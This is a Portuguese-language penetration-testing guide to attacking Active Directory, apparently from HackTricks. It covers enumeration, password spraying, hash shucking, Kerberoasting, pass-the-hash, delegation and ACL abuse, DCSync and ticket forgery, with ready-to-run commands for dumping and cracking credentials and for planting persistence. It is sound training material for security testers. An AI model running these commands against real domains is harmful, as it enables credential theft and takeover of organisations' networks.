# Metodologia do Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Visão geral básica

**Active Directory** serve como uma tecnologia fundamental, permitindo que **administradores de rede** criem e gerenciem eficientemente **domínios**, **usuários** e **objetos** dentro de uma rede. Foi projetado para escalar, facilitando a organização de um grande número de usuários em **grupos** e **subgrupos** gerenciáveis, enquanto controla **direitos de acesso** em vários níveis.

A estrutura do **Active Directory** é composta por três camadas principais: **domínios**, **árvores** e **florestas**. Um **domínio** engloba uma coleção de objetos, como **usuários** ou **dispositivos**, que compartilham um banco de dados comum. **Árvores** são grupos desses domínios ligados por uma estrutura compartilhada, e uma **floresta** representa a coleção de múltiplas árvores, interconectadas através de **relações de confiança**, formando a camada superior da estrutura organizacional. Direitos específicos de **acesso** e **comunicação** podem ser designados em cada um desses níveis.

Conceitos-chave dentro do **Active Directory** incluem:

1. **Diretório** – Abriga todas as informações referentes aos objetos do Active Directory.
2. **Objeto** – Denota entidades dentro do diretório, incluindo **usuários**, **grupos** ou **pastas compartilhadas**.
3. **Domínio** – Serve como um contêiner para objetos do diretório, com a possibilidade de múltiplos domínios coexistirem dentro de uma **floresta**, cada um mantendo sua própria coleção de objetos.
4. **Árvore** – Um agrupamento de domínios que compartilham um domínio raiz em comum.
5. **Floresta** – O ápice da estrutura organizacional no Active Directory, composto por várias árvores com **relações de confiança** entre elas.

**Active Directory Domain Services (AD DS)** abrange uma série de serviços críticos para o gerenciamento centralizado e a comunicação dentro de uma rede. Esses serviços incluem:

1. **Domain Services** – Centraliza o armazenamento de dados e gerencia as interações entre **usuários** e **domínios**, incluindo funcionalidades de **autenticação** e **busca**.
2. **Certificate Services** – Supervisiona a criação, distribuição e gerenciamento de **certificados digitais** seguros.
3. **Lightweight Directory Services** – Dá suporte a aplicações habilitadas para diretório através do **LDAP protocol**.
4. **Directory Federation Services** – Fornece funcionalidades de **single-sign-on** para autenticar usuários através de múltiplas aplicações web em uma única sessão.
5. **Rights Management** – Ajuda a proteger material com direitos autorais, regulando sua distribuição e uso não autorizados.
6. **DNS Service** – Crucial para a resolução de **nomes de domínio**.

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Autenticação Kerberos**

Para aprender como **atacar um AD** você precisa entender muito bem o processo de autenticação Kerberos.\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## Guia Rápido

Você pode acessar https://wadcoms.github.io/ para ter uma visão rápida de quais comandos você pode executar para enumerar/explorar um AD.

> [!WARNING]
> A comunicação Kerberos **requer um nome totalmente qualificado (FQDN)** para executar ações. Se você tentar acessar uma máquina pelo endereço IP, **será usado NTLM e não Kerberos**.

## Recon Active Directory (Sem credenciais/sessões)

Se você só tem acesso a um ambiente AD mas não possui credenciais/sessões, você pode:

- **Pentest the network:**
- Escanear a rede, encontrar máquinas e portas abertas e tentar **explorar vulnerabilidades** ou **extrair credenciais** delas (por exemplo, [printers could be very interesting targets](ad-information-in-printers.md)).
- Enumerar o DNS pode fornecer informações sobre servidores-chave no domínio como web, printers, shares, vpn, media, etc.
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- Dê uma olhada na página geral [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) para encontrar mais informações sobre como fazer isso.
- **Verificar acesso null e Guest em serviços smb** (isso não funcionará em versões modernas do Windows):
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- Um guia mais detalhado sobre como enumerar um servidor SMB pode ser encontrado aqui:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- Um guia mais detalhado sobre como enumerar LDAP pode ser encontrado aqui (preste **atenção especial ao acesso anônimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- Coletar credenciais **imitando serviços com Responder** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
- Acessar hosts **abusando do relay attack** (../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
- Coletar credenciais **expondo** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- Extrair nomes de usuários/nomes de documentos internos, redes sociais, serviços (principalmente web) dentro dos ambientes do domínio e também de fontes publicamente disponíveis.
- Se você encontrar os nomes completos dos funcionários da empresa, pode tentar diferentes convenções de **username AD** ([**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)). As convenções mais comuns são: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatórias e 3 números aleatórios_ (abc123).
- Ferramentas:
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeração de usuários

- **Anonymous SMB/LDAP enum:** Confira as páginas [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) e [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Kerbrute enum**: Quando um **nome de usuário inválido é solicitado**, o servidor responderá usando o código de erro Kerberos _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, permitindo determinar que o nome de usuário era inválido. **Nomes de usuário válidos** provocarão ou o **TGT** em uma resposta **AS-REP** ou o erro _KRB5KDC_ERR_PREAUTH_REQUIRED_, indicando que o usuário é obrigado a realizar pre-autenticação.
- **No Authentication against MS-NRPC**: Usando auth-level = 1 (No authentication) contra a interface MS-NRPC (Netlogon) em domain controllers. O método chama a função `DsrGetDcNameEx2` após fazer bind na interface MS-NRPC para verificar se o usuário ou computador existe sem qualquer credencial. A ferramenta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa esse tipo de enumeração. A pesquisa pode ser encontrada [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

Se você encontrar um desses servidores na rede, também pode realizar **user enumeration against it**. Por exemplo, você pode usar a ferramenta [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> Você pode encontrar listas de nomes de usuário em [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  e neste ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> No entanto, você deve ter o **nome das pessoas que trabalham na empresa** a partir da etapa de recon que deveria ter realizado antes disso. Com o nome e sobrenome você pode usar o script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para gerar possíveis nomes de usuário válidos.

### Sabendo um ou vários nomes de usuário

Ok, então você já sabe que tem um nome de usuário válido mas sem senhas... Então tente:

- [**ASREPRoast**](asreproast.md): Se um usuário **não possui** o atributo _DONT_REQ_PREAUTH_ você pode **solicitar uma AS_REP message** para esse usuário que conterá alguns dados criptografados por uma derivação da senha do usuário.
- [**Password Spraying**](password-spraying.md): Vamos tentar as **senhas mais comuns** com cada um dos usuários descobertos; talvez algum usuário esteja usando uma senha fraca (lembre-se da política de senhas!).
- Observe que você também pode **spray OWA servers** para tentar obter acesso aos servidores de email dos usuários.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Você pode ser capaz de **obtain** alguns challenge **hashes** para crackar, fazendo **poisoning** em alguns protocolos da **network**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Se você conseguiu enumerar o Active Directory você terá **mais emails e uma melhor compreensão da rede**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) para obter acesso ao ambiente AD.

### NetExec workspace-driven recon & relay posture checks

- Use **`nxcdb` workspaces** para manter o estado de recon do AD por engajamento: `workspace create <name>` gera DBs SQLite por protocolo em `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Alterne visualizações com `proto smb|mssql|winrm` e liste segredos coletados com `creds`. Remova manualmente dados sensíveis quando terminar: `rm -rf ~/.nxc/workspaces/<name>`.
- Descoberta rápida de sub-rede com **`netexec smb <cidr>`** expõe **domain**, **OS build**, **SMB signing requirements**, e **Null Auth**. Membros mostrando `(signing:False)` são **relay-prone**, enquanto DCs frequentemente exigem signing.
- Gere **hostnames in /etc/hosts** diretamente a partir da saída do NetExec para facilitar o direcionamento:
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- Quando **SMB relay to the DC is blocked** por signing, ainda verifique a postura do **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / weak channel binding. Um DC com SMB signing required mas LDAP signing disabled continua sendo um alvo viável de **relay-to-LDAP** para abusos como **SPN-less RBCD**.

### Client-side printer credential leaks → validação em massa de credenciais de domínio

- Printer/web UIs às vezes **embed masked admin passwords in HTML**. Visualizar o source/devtools pode revelar cleartext (e.g., `<input value="<password>">`), permitindo acesso Basic-auth a repositórios de scan/print.
- Jobs de impressão recuperados podem conter **plaintext onboarding docs** com senhas por usuário. Mantenha os emparelhamentos alinhados ao testar:
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### Roubar Credenciais NTLM

Se você pode **acessar outros PCs ou shares** com o **null ou guest user** você pode **colocar arquivos** (como um arquivo SCF) que se de alguma forma forem acessados vão **disparar uma autenticação NTLM contra você** para que você possa **roubar** o **challenge NTLM** e crackeá-lo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada hash NT que você já possui como uma senha candidata para outros formatos mais lentos cujo material de chave é derivado diretamente do hash NT. Em vez de brute-forcear longas passphrases em tickets Kerberos RC4, desafios NetNTLM, ou credenciais em cache, você alimenta os hashes NT nos modos NT-candidate do Hashcat e deixa que ele valide o reuso de senha sem nunca aprender o plaintext. Isso é especialmente potente após um compromisso de domínio onde você pode colher milhares de hashes NT atuais e históricos.

Use shucking quando:

- Você tem um corpus de NT a partir de DCSync, dumps SAM/SECURITY, ou vaults de credenciais e precisa testar reuso em outros domínios/florestas.
- Você captura material Kerberos baseado em RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respostas NetNTLM, ou blobs DCC/DCC2.
- Você quer provar rapidamente o reuso para passphrases longas e intratáveis e pivotar imediatamente via Pass-the-Hash.

A técnica **não funciona** contra tipos de cifragem cujas chaves não são o hash NT (por ex., Kerberos etype 17/18 AES). Se um domínio impõe apenas AES, você deve voltar aos modos regulares de senha.

#### Construindo um corpus de hashes NT

- **DCSync/NTDS** – Use `secretsdump.py` com history para pegar o maior conjunto possível de hashes NT (e seus valores anteriores):

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

Entradas de history ampliam dramaticamente o pool de candidatos porque a Microsoft pode armazenar até 24 hashes anteriores por conta. Para mais formas de colher segredos do NTDS veja:

{{#ref}}
dcsync.md
{{#endref}}

- **Dumps de cache de endpoint** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (ou Mimikatz `lsadump::sam /patch`) extrai dados locais SAM/SECURITY e logons de domínio em cache (DCC/DCC2). Deduplicate e acrescente esses hashes ao mesmo arquivo `nt_candidates.txt`.
- **Rastreie metadados** – Mantenha o username/domínio que gerou cada hash (mesmo se o wordlist contiver apenas hex). Hashes correspondentes dizem imediatamente qual principal está reutilizando uma senha assim que o Hashcat imprimir o candidato vencedor.
- Prefira candidatos da mesma floresta ou de uma floresta confiável; isso maximiza a chance de overlap ao shuckar.

#### Modos NT-candidate do Hashcat

| Tipo de Hash                             | Modo de Senha | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- Inputs NT-candidate **devem permanecer como hashes NT brutos de 32 hex**. Desative engines de regras (sem `-r`, sem modos híbridos) porque mangling corrompe o material chave candidato.
- Esses modos não são inerentemente mais rápidos, mas o keyspace NTLM (~30,000 MH/s em um M3 Max) é ~100× mais rápido que Kerberos RC4 (~300 MH/s). Testar uma lista NT curada é muito mais barato do que explorar todo o espaço de senhas no formato lento.
- Sempre rode o **último build do Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`) porque os modos 31500/31600/35300/35400 foram lançados recentemente.
- Atualmente não existe um modo NT para AS-REQ Pre-Auth, e etypes AES (19600/19700) requerem a senha em plaintext porque suas chaves são derivadas via PBKDF2 de senhas UTF-16LE, não de hashes NT brutos.

#### Exemplo – Kerberoast RC4 (modo 35300)

1. Capture um TGS RC4 para um SPN alvo com um usuário de baixo privilégio (veja a página Kerberoast para detalhes):

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. Shuck o ticket com sua lista NT:

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

O Hashcat deriva a chave RC4 a partir de cada candidato NT e valida o blob `$krb5tgs$23$...`. Uma correspondência confirma que a conta de serviço usa um dos seus hashes NT existentes.

3. Pivot imediatamente via PtH:

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

Você pode opcionalmente recuperar o plaintext depois com `hashcat -m 1000 <matched_hash> wordlists/` se necessário.

#### Exemplo – Credenciais em cache (modo 31600)

1. Faça dump dos logons em cache de uma workstation comprometida:

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. Copie a linha DCC2 para o usuário de domínio interessante em `dcc2_highpriv.txt` e shucke-a:

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. Uma correspondência bem-sucedida revela o hash NT já conhecido na sua lista, provando que o usuário em cache está reutilizando uma senha. Use-o diretamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) ou brute-forceie-o em modo NTLM rápido para recuperar a string.

O mesmo fluxo exato se aplica a respostas de desafio NetNTLM (`-m 27000/27100`) e DCC (`-m 31500`). Uma vez identificada a correspondência você pode lançar relay, SMB/WMI/WinRM PtH, ou re-crackear o hash NT com masks/rules offline.



## Enumerando Active Directory COM credenciais/sessão

Para esta fase você precisa ter **comprometido as credenciais ou uma sessão de uma conta de domínio válida.** Se você tem algumas credenciais válidas ou um shell como um usuário de domínio, **lembre-se de que as opções dadas antes ainda são opções para comprometer outros usuários**.

Antes de começar a enumeração autenticada você deve saber qual é o **problema do double hop do Kerberos.**


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeração

Ter comprometido uma conta é um **grande passo para começar a comprometer todo o domínio**, porque você vai poder iniciar a **Enumeração do Active Directory:**

Referente a [**ASREPRoast**](asreproast.md) você agora pode encontrar todo usuário possivelmente vulnerável, e referente a [**Password Spraying**](password-spraying.md) você pode obter uma **lista de todos os usernames** e tentar a senha da conta comprometida, senhas vazias e novas senhas promissoras.

- Você poderia usar o [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- Você também pode usar [**powershell for recon**](../basic-powershell-for-pentesters/index.html) que será mais stealthy
- Você também pode [**use powerview**](../basic-powershell-for-pentesters/powerview.md) para extrair informação mais detalhada
- Outra ferramenta incrível para recon em um active directory é [**BloodHound**](bloodhound.md). Não é **muito stealthy** (dependendo dos métodos de coleta que você usar), mas **se você não se importa** com isso, você definitivamente deveria experimentar. Encontre onde usuários podem RDP, encontre caminhos para outros grupos, etc.
- **Outras ferramentas automatizadas de enumeração AD são:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS records of the AD**](ad-dns-records.md) pois eles podem conter informação interessante.
- Uma **ferramenta com GUI** que você pode usar para enumerar o diretório é **AdExplorer.exe** do **SysInternal** Suite.
- Você também pode buscar no banco LDAP com **ldapsearch** para procurar credenciais em campos _userPassword_ & _unixUserPassword_, ou mesmo em _Description_. cf. [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para outros métodos.
- Se você está usando **Linux**, você também poderia enumerar o domínio usando [**pywerview**](https://github.com/the-useless-one/pywerview).
- Você também poderia tentar ferramentas automatizadas como:
- [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
- [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraindo todos os usuários do domínio**

É muito fácil obter todos os usernames do domínio a partir do Windows (`net user /domain` ,`Get-DomainUser` ou `wmic useraccount get name,sid`). No Linux, você pode usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` ou `enum4linux -a -u "user" -p "password" <DC IP>`

> Mesmo que esta seção de Enumeração pareça pequena, esta é a parte mais importante de todas. Acesse os links (principalmente os de cmd, powershell, powerview e BloodHound), aprenda como enumerar um domínio e pratique até se sentir confortável. Durante um assessment, este será o momento chave para encontrar o seu caminho até DA ou para decidir que nada pode ser feito.

### Kerberoast

Kerberoasting envolve obter **TGS tickets** usados por serviços ligados a contas de usuário e crackear sua cifragem — que é baseada nas senhas dos usuários — **offline**.

Mais sobre isto em:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexão remota (RDP, SSH, FTP, Win-RM, etc)

Uma vez que você obteve algumas credenciais você pode checar se tem acesso a alguma **máquina**. Para isso, você pode usar **CrackMapExec** para tentar conectar em vários servidores com diferentes protocolos, de acordo com seus scans de portas.

### Escalada de Privilégios Local

Se você comprometeu credenciais ou uma sessão como um usuário de domínio regular e você tem **acesso** com esse usuário a **qualquer máquina no domínio** você deve tentar encontrar uma forma de **escalar privilégios localmente e saquear por credenciais**. Isso porque somente com privilégios de administrador local você será capaz de **dump hashes de outros usuários** na memória (LSASS) e localmente (SAM).

Há uma página completa neste livro sobre [**local privilege escalation in Windows**](../windows-local-privilege-escalation/index.html) e uma [**checklist**](../checklist-windows-privilege-escalation.md). Além disso, não esqueça de usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets da Sessão Atual

É **muito improvável** que você encontre **tickets** no usuário atual que lhe dêem permissão para acessar recursos inesperados, mas você pode checar:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Se você conseguiu enumerar o Active Directory você terá **mais emails e uma melhor compreensão da rede**. Você pode ser capaz de forçar NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Procurar Creds em Compartilhamentos de Computadores | SMB Shares

Agora que você tem algumas credentials básicas você deve verificar se pode **encontrar** quaisquer **arquivos interessantes sendo compartilhados dentro do AD**. Você poderia fazer isso manualmente mas é uma tarefa muito entediante e repetitiva (e mais ainda se encontrar centenas de docs que precisa checar).

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

Se você pode **acessar outros PCs ou shares** você poderia **colocar arquivos** (like a SCF file) que se de alguma forma acessados irão t**rigger an NTLM authentication against you** assim você pode **steal** o **NTLM challenge** para crackear:

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Essa vulnerabilidade permitia que qualquer usuário autenticado **comprometesse o controlador de domínio**.

{{#ref}}
printnightmare.md
{{#endref}}

## Elevação de privilégio no Active Directory COM credenciais/sessão privilegiadas

**Para as técnicas a seguir um usuário de domínio comum não é suficiente, você precisa de alguns privilégios/credenciais especiais para realizar esses ataques.**

### Hash extraction

Com sorte você conseguiu **comprometer alguma conta de administrador local** usando [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) incluindo relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Então, é hora de dump all the hashes in memory and locally.\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
Você precisa usar alguma **ferramenta** que irá **realizar** a **autenticação NTLM usando** esse **hash**, **ou** você pode criar um novo **sessionlogon** e **injetar** esse **hash** dentro do **LSASS**, de forma que quando qualquer **NTLM authentication is performed**, esse **hash será usado.** A última opção é o que mimikatz faz.\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Esse ataque tem como objetivo **usar o NTLM hash do usuário para solicitar tickets Kerberos**, como alternativa ao comum Pass The Hash sobre o protocolo NTLM. Portanto, isso pode ser especialmente **útil em redes onde o protocolo NTLM está desabilitado** e apenas **Kerberos é permitido** como protocolo de autenticação.

{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

No método de ataque **Pass The Ticket (PTT)**, atacantes **roubam o ticket de autenticação de um usuário** ao invés de sua senha ou valores de hash. Esse ticket roubado é então usado para **se passar pelo usuário**, obtendo acesso não autorizado a recursos e serviços dentro da rede.

{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

Se você tem o **hash** ou **password** de um **administrador local** você deve tentar **iniciar sessão localmente** em outros **PCs** com ele.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Observe que isto é bastante **ruidoso** e o **LAPS** **mitigaria** isso.

### Abuso de MSSQL e Trusted Links

Se um usuário tem privilégios para **access MSSQL instances**, ele poderia usá-lo para **execute commands** no host MSSQL (se rodando como SA), **steal** o NetNTLM **hash** ou até realizar um **relay attack**.\
Além disso, se uma instância MSSQL for trusted (database link) por uma instância MSSQL diferente. Se o usuário tem privilégios sobre o banco de dados confiável, ele poderá **usar a trust relationship para executar queries também na outra instância**. Essas relações de confiança podem ser encadeadas e em algum momento o usuário pode encontrar um banco de dados mal configurado onde possa executar comandos.\
**As links entre databases funcionam mesmo através de forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de inventário/implantação de TI

Suites de inventário e implantação de terceiros frequentemente expõem caminhos poderosos para credenciais e execução de código. Veja:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Se você encontrar qualquer objeto Computer com o atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) e você tiver privilégios de domínio no computador, você poderá dumpar TGTs da memória de todos os usuários que fizerem login no computador.\
Portanto, se um **Domain Admin fizer login no computador**, você poderá dumpar seu TGT e se impersonar dele usando [Pass the Ticket](pass-the-ticket.md).\
Graças à constrained delegation você poderia até **comprometer automaticamente um Print Server** (esperançosamente será um DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Se um usuário ou computador tem permissão para "Constrained Delegation", ele poderá **impersonate any user to access some services in a computer**.\
Então, se você **compromise the hash** desse usuário/computador você poderá **impersonate any user** (até domain admins) para acessar alguns serviços.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Ter privilégio de **WRITE** em um objeto Active Directory de um computador remoto possibilita a obtenção de execução de código com **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de Permissions/ACLs

O usuário comprometido pode ter alguns **privilégios interessantes sobre certos objetos de domínio** que poderiam permitir que você **mover-se** lateralmente/**escalar** privilégios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso do serviço Printer Spooler

Descobrir um **Spool service listening** dentro do domínio pode ser **abusado** para **adquirir novas credenciais** e **escalar privilégios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sessões de terceiros

Se **outros usuários** **access** a máquina **comprometida**, é possível **gather credentials from memory** e até **inject beacons in their processes** para se impersonar deles.\
Normalmente os usuários acessam o sistema via RDP, então aqui você tem como realizar um par de ataques sobre sessões RDP de terceiros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** fornece um sistema para gerenciar a **local Administrator password** em computadores ingressados no domínio, garantindo que ela seja **randomized**, única e frequentemente **changed**. Essas senhas são armazenadas no Active Directory e o acesso é controlado através de ACLs apenas para usuários autorizados. Com permissões suficientes para acessar essas senhas, torna-se possível pivotar para outros computadores.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**Gathering certificates** da máquina comprometida pode ser uma forma de escalar privilégios dentro do ambiente:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Se **vulnerable templates** estiverem configurados, é possível abusar deles para escalar privilégios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Pós-exploração com conta de alto privilégio

### Extração de credenciais do domínio

Uma vez que você obtenha privilégios de **Domain Admin** ou, ainda melhor, **Enterprise Admin**, você pode **dump** o **domain database**: _ntds.dit_.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc como persistência

Algumas das técnicas discutidas antes podem ser usadas para persistência.\
Por exemplo, você poderia:

- Tornar usuários vulneráveis a [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Tornar usuários vulneráveis a [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Conceder privilégios [**DCSync**](#dcsync) a um usuário

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

O **Silver Ticket attack** cria um **legítimo Ticket Granting Service (TGS) ticket** para um serviço específico usando o **NTLM hash** (por exemplo, o **hash da conta do PC**). Este método é empregado para **access the service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Um **Golden Ticket attack** envolve um atacante obtendo acesso ao **NTLM hash of the krbtgt account** em um ambiente Active Directory (AD). Esta conta é especial porque é usada para assinar todos os **TGTs**, que são essenciais para autenticação dentro da rede AD.

Uma vez que o atacante obtém esse hash, ele pode criar **TGTs** para qualquer conta que escolher (Silver ticket attack).


